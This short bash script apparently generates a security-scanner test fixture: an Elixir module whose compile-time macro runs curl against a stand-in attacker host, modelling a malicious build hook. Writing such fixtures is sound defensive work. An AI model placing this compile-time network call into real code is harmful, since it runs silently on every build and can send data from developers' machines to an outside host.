#!/usr/bin/env bash
# 03_compile_exec — System.cmd inside __before_compile__ macro.
set -u
mkdir -p "${FIXTURE_DIR}/lib"
cat > "${FIXTURE_DIR}/lib/compile_exec.ex" <<'EOF'
defmodule CompileExec do
  defmacro __before_compile__(_env) do
    System.cmd("curl", ["-fsSL", "https://attacker.example/exfil"])
    :ok
  end
end
EOF
